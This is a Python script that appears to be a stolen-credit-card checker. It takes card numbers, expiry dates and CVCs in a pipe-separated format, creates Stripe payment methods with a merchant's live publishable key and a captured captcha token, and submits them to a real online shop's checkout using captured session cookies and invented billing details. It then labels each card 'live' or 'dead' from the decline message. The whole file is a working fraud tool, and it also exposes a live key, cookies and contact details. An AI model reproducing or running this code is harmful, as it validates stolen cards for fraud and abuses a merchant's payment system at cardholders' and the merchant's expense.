import time
import user_agent
user_agento = user_agent.generate_user_agent()

def checker_stripe(ccx):
    import requests
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

    data = f'billing_details[address][state]=NY&billing_details[address][postal_code]=11743-0075&billing_details[address][country]=US&billing_details[address][city]=Huntington&billing_details[address][line1]=75+Po+Box&billing_details[address][line2]=&billing_details[email]=vodadone4%40gmail.com&billing_details[name]=John+Kamek&billing_details[phone]=(617)+232-5420&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F477d460935%3B+stripe-js-v3%2F477d460935%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fshop.manner.com&time_on_page=97411&client_attribution_metadata[client_session_id]=01cf915c-3416-4dac-9819-c10b0cf12fad&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=5ec01a2a-468b-4d9c-9059-8db636ed98a8&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=f377f6f5-61f5-42f8-89fb-7812a1c9f2127d38b8&muid=9bdc2e00-a940-411a-bdb0-e06aadbdd6dcfef447&sid=ae2fbc6d-d2c7-4349-b600-0595e48525b57e1cd5&key=pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq&_stripe_version=2025-08-27.basil&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwODI1MDYxLCJjZGF0YSI6InJKaklRdFJUS3VwWHNtK2VEZHZPeHlKZEU0dnNHQnVyc2hkdnRtdUdlWFZ5d05XcXJrZlNBdTZHZXJDVkZWVkZuL20veGt2cW4yYmhHYnFhaldTY0FueXVRcWJLRkIwTmlkQ2h5SGI2Q3VrWEU0SXIvRTUwYlliai9sQy93OXpyRXY0VXBlcDg2Y2Z0bld4UU1hWktsUmNNZjlFak4xemd5UnpGRWo3OTdOUExTa0dvUmtKeHBhUHBQbHoxY013NU5QelBtakYrY0w0cldjOVkySXAxREpzRWJBNURIWk5CMGd1RkJsNExZUjlKbVgvU2ZVRnFjek9FWkdLSnJMaDJ3N3cwZUp2ZVoyY1hCbjhtcW1SUzVZU2x5OE8vTTdETXN3T3NmRXhVcVdtSE9taTcwc1NFdWsybERpRmNkdFRjNWlmV2hUN1MrZGsxcHBBZFFqV05zOVBXODMrMk9MMGxhMXVvak92dThLOD1WUm9YMDFtSUh6WWR3NHBkIiwicGFzc2tleSI6IlB1TXhldFdKSWg4U1llTDhCeUwxVHNDSWNkOWxaT0g3ZHVqdzFNRm1SMmN6NTYyT2NFN2VTMXd3NThnbW9FekxVZU5VS3ZlQXFodFFsK1pybnBqZnN3RWUvN1kwZGVJdURFZ1BVL0FVK1h0L0JvTklRMkJMTER3dTF4V21yZmdpQUw1NG9JNlVvV0Y0WDFyMHl4aUZ5eUJuRHQ2Y2dOSXNGc1NmcThlaTlyUS9vVHBJeFBEdmRCQ0dtZlp6MDltMFpTb01XdjZZSkhmemVGakpES0RzZlhoZ3FYWVBHa2ZDSklmOTFrZ3ppNGpBNHlWVWRuNnRIaFg5SGg3Q05oZFB2eXNLaW9DRG05aFg4eGlZNFk3MmZNeUl6MFVKRno5aXZmTEQ5UHpFTVdUeDVMZGZBdlVnYnBQakFLN1h3WDl6OERCY01WOUtESzJXV3NvV0VBKzlSZ2g0UU5mVWRQTnZUWjZNMGt0TzY4Y05OaFM3QitsUUZNSW5XNnVJSEJnZjlvZ2VmTHlPbVZ4bmlTd2daUGJRMzJyeXMxMWgyVllsaFlyZGZhWm9QYVlEQUxqREZQSmV0amNiU29lQjdScUF0QU1RKzlpWXFoSW40R29YR2FvRkYySmx4NE1vQ2RSZ1FGeitJWVR3Zld3S2VWWDB1ZURnTjlkUVNnSWs3STNidjJGdldFMGJRRnZqblNSOG1LcG82ZU5LajlRQVpybkxJa25Nc09MaGRaejJDQkVxSERENFYzMTRRSWdDdFE0eVQydVVBNFFuZEtXV2h2REJTbFlZMVZYZFFDZEpQaCtVK1ZPZHRMT055Sk5oN1h0VUNQL1pONm1vQkZXeE0xRjBBbU1scWtvU1pZRWFvaHZDSEc2TVNvMm1CRVR1Yk1TYzZEL0gvUVlzNEMrclNrNTl3T3podlNsQzdKcDhacGkxNWdFcUc0WTBCR28xa3lXSXA2eFdycFByUmVhSyt3eTZlRDRncWVnbXhBQXNVdmJvc1dDaW8rTi9iTURId1dySmxYdlhjWTJiMWxWZ2F0bnJJYVNWaFR4RXNSZTBQN2tXMWI0N04yYTNpZVpYT3VYYnc1NVFoSllaUGZNY2daV2xHSnFzK0JMVS9JL3ZUaE9heTN1UDNyeG8yRVA5MyszdURFTjFpU2Y4YzRJbzZtam9WcTdYWXZFUUJBczU0Nzk5RmRJTzlyVU9VdE1PSG8zV0MwN0pBSFpuY1NZejlkNlJuejNzWmR5a2R5dXE4RmRxNzhEV3dyRHJVSU5jdFN6elo4TzdaWEt1OXVnQUhKRWpFWXZ5eTN5d3VUQjJUUUwzT1FKNzBtUnpMdSs5QlgvSjlLL2RPcjAyUUdUVHh3K2NxM2FhZ3c2S3ZkTzhUc1lFdlZtNG9RZHNWVjhhVnB0aU4za2hFQktBVmlSeXBTL053TEZQblpZUjcvZjFyR0czbSs5a2hYVTBtN1ZNV0NhT3R3RlZoaEpqNzg5MU83SEZ2ZGFvTllYR0FWbk5QQVIyTWtxQlpKNHE3UFgrWmw0WTRaQUVRallYeDRJNTV6aGxrdURKQ2R3aGFtdTFtdW1BakVCaWtmblk5VnRuYUVTVmZ4d2J3cnJXK0k4ZlJzODhCU3l0b2VQQS9GYzJHRXdNWENmV0NMcHArMmRHTS9ldjQ2aG9EMjBBOHorejkxMGZNSXB1WkFpTURpN3FDdnI4TXVjV0NmYmVVay91YnZDSFk4TnJ2N1ZkOHltbHhNd2dqejU3MWx2ZWlYVnlMNEk1REY5eFlLTFJxUTdUaytFNHVqOTF2dFBaai9OM0I5b0oyL2FoMkFLRWZ4bWdqZmpNb3o5c0UyQXZwM1hsK1I2MUFmdjBpQXdiRUI2RmNsbDd6N3lkOVVGOEZCR3Z1eDQvRkxLbTUvOUU3UTBQaDcxWTM3UmJZOHdPWkc0UHdpTzFWdFFLYytTUm82blhKZncwQnp3VDNJZHZ0UFNHVVJ1Zkc2WmJmMzg3VUFLZFVFS0JVcmtndHRnQm9hTjRXTGQ0N3FRVERUSm5HV093amQ2WW1hTmJ3RnVzZjlhQmJPTWk3dURvQUJySDRIdUxxL0lSb0pxY2FFZXY2cU9FdDBIWnlxUkp3VnlCaHU0VFJKelhRNmJLSG5QbTY4OUlVcnJybk9FdFJFbVMzOHk2UjEwVnpxbjRXZ2dmUHdURmRRcEhrRGx5OUtpckpZSlkyNnVVOWlDcXEyOEoxSFBFM1hnTFlteXhRTmQ2YnFxeEtpcGxOWUM5M0FLRGdmNU5uS0Q3ZkoyS3djenB4eDFqV1VZalNZcWZiYWM1MTBPRmF4M05EZ1J6dTFCOVg4YjFucWtCZVZ0VThNL05QcG9kZk1wdXNrais1ektrNUhkblVRb1Q2OFh1MnV2Z2xxcnJYYjVEdHlxaWNGenBwbW84b1BSUTJleUtta0x2N1EvNDY4WWkzL2pKOVlsa05iZkVmTVJxZUlvbXFtT3JLbUpXQURadVhxbDZ6eXlpLzRmdjlNVjBYZmlqc2hXRWEzL0ZHMTI5dkZzR1JlVjYrTTh6eXZrMGlQdERQNHdMdVAveWN4U2JlczFjSXN5UWkxUVAybHZ5aXhMdTJrL1ciLCJrciI6ImNkN2E2ZDQiLCJzaGFyZF9pZCI6NTM1NzY1NTl9.UYwtSnEV6P8PKJd_GkELvVy78QjPxUaYe4pvyEBQlX0'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    idi = response.json()['id']
    print(idi)    
    
    cookies = {
    'PHPSESSID': 'gbc6dg8r2bt8qag7113k6kd8cs',
    'X-Magento-Vary': '1f62c8352e88c8b48b0f3c3c248d16c7dfafdeeb10e393475420db9df175a2fe',
    'STUID': '0d5f675f-a92c-98c2-51b0-1ef3050e4b74',
    'STVID': '9290a38d-abac-6e39-26ab-c8e4efc6dad6',
    '_ALGOLIA': 'anonymous-e1e15ff8-0356-4598-8762-4918d0f92b21',
    'form_key': 'qaixdB2widl7LpMX',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    '_pk_ref.6.9cad': '%5B%22%22%2C%22%22%2C1770824865%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.6.9cad': 'f85ea28125737b71.1770824865.',
    '_pk_ses.6.9cad': '1',
    '_pk_ref.9.9cad': '%5B%22%22%2C%22%22%2C1770824865%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.9.9cad': '5404c79c0921fc29.1770824865.',
    '_pk_ses.9.9cad': '1',
    'cookie_consent': '%7B%22groups%22%3A%5B%22necessary%22%2C%22marketing%22%2C%22analytics%22%5D%2C%22rejected%22%3A%5B%5D%2C%22date%22%3A1770824865558%7D',
    '_ga': 'GA1.1.1245669597.1770824866',
    'form_key': 'qaixdB2widl7LpMX',
    'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
    '__stripe_mid': '9bdc2e00-a940-411a-bdb0-e06aadbdd6dcfef447',
    '__stripe_sid': 'ae2fbc6d-d2c7-4349-b600-0595e48525b57e1cd5',
    '_gcl_au': '1.1.1119162763.1770824871',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'amzn-checkout-session': '{}',
    'private_content_version': 'c5a2a836ecd0039b566692b2edf92fdc',
    '_ga_QK5V5KEW9J': 'GS2.1.s1770824865$o1$g1$t1770824971$j60$l0$h0',
    'section_data_ids': '{%22cart%22:1770825898%2C%22directory-data%22:1770824887%2C%22wp_ga4%22:1770824979%2C%22messages%22:1770824979}',
    '_ga_9GBVNR2THC': 'GS2.1.s1770824865$o1$g1$t1770824980$j15$l0$h1423083331',
}

    headers = {
    'authority': 'shop.manner.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://shop.manner.com',
    'referer': 'https://shop.manner.com/man_int/checkout/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    json_data = {
    'cartId': 'mrsoB7OUsCSgeygOTKHMtPDhsRR7XKr8',
    'billingAddress': {
        'countryId': 'US',
        'regionId': '43',
        'regionCode': 'NY',
        'region': 'New York',
        'street': [
            '75 Po Box',
            '',
            '',
        ],
        'company': '',
        'telephone': '(617) 232-5420',
        'postcode': '11743-0075',
        'city': 'Huntington',
        'firstname': 'John',
        'lastname': 'Kamek',
        'vatId': '',
        'saveInAddressBook': None,
    },
    'paymentMethod': {
        'method': 'stripe_payments',
        'additional_data': {
            'payment_method': idi,
        },
        'extension_attributes': {
            'agreement_ids': [
                '3',
                '4',
                '3',
                '4',
            ],
        },
    },
    'email': 'vodadone4@gmail.com',
}

    response = requests.post(
    'https://shop.manner.com/man_int/rest/man_int/V1/guest-carts/mrsoB7OUsCSgeygOTKHMtPDhsRR7XKr8/payment-information',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
    req = response.json()['validation_feedback']
    print(req)
    time.sleep(5)
    if 'Your card was declined.' in req:
        return 'dead'
    else:
        return 'live'